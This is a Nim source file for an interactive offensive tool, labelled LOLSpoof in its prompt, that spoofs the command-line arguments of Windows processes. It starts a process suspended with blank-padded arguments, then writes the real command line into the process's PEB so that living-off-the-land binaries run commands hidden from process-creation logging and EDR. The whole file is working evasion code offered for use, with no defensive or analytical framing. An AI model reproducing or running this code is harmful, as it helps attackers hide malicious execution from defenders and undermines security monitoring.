import os
import winim
import rdstdin
import strutils

proc executeSpoofedLolbin(realCmdlineN: string): bool =

    # Create spoodef cmdline
    var binary = realCmdlineN.split(" ")[0]
    var argsLen = len(realCmdlineN) - len(binary)
    var spoofedCmdlineN = binary & ' '.repeat(argsLen)
    var realCmdline = newWideCString(realCmdlineN)
    var spoofedCmdline = newWideCString(spoofedCmdlineN)

    # Create suspended process
    var si: STARTUPINFOEX
    var pi: PROCESS_INFORMATION
    if CreateProcess(
        NULL,
        spoofedCmdline,
        NULL,
        NULL, 
        FALSE,
        CREATE_SUSPENDED,
        NULL,
        NULL,
        addr si.StartupInfo,
        addr pi
    ) != TRUE:
        return false

    # Get remote PEB address
    var bi: PROCESS_BASIC_INFORMATION
    var ret: DWORD
    if NtQueryInformationProcess(
        pi.hProcess,
        0,
        addr bi,
        cast[windef.ULONG](sizeof(bi)),
        addr ret
    ) != 0:
        return false
    
    # Get RTL_USER_PROCESS_PARAMETERS address
    let peb = bi.PebBaseAddress
    let processParametersOffset = cast[int](peb) + 0x20
    var processParametersAddress: LPVOID
    if ReadProcessMemory(pi.hProcess, cast[LPCVOID](processParametersOffset), addr processParametersAddress, 8, NULL) != TRUE:
        return false

    # Get CommandLine member address
    var cmdLineOffset = cast[int](processParametersAddress) + 0x70 + 0x8
    var cmdLineAddress: LPVOID
    if ReadProcessMemory(pi.hProcess, cast[LPCVOID](cmdLineOffset), addr cmdLineAddress, 8, NULL) != TRUE:
        return false
    
    # Change command line
    if WriteProcessMemory(
        pi.hProcess,
        cast[LPVOID](cmdLineAddress),
        cast[LPCVOID](realCmdline),
        len(realCmdline) * 2,
        NULL
    ) != TRUE:
        return false

    # Resume process
    ResumeThread(pi.hThread)
    WaitForSingleObject(pi.hThread, INFINITE)
    return true


when isMainModule:
    while true:
        flushFile(stdin)
        flushFile(stdout)
        flushFile(stderr)
        var cmdline = readLineFromStdin("[LOLSpoof] > ")
        var cmdlineSeq = cmdline.split(" ")
        var binary = findExe(cmdlineSeq[0])
        cmdlineSeq[0] = binary
        cmdline = join(cmdlineSeq, " ")
        var res = executeSpoofedLolbin(cmdline)

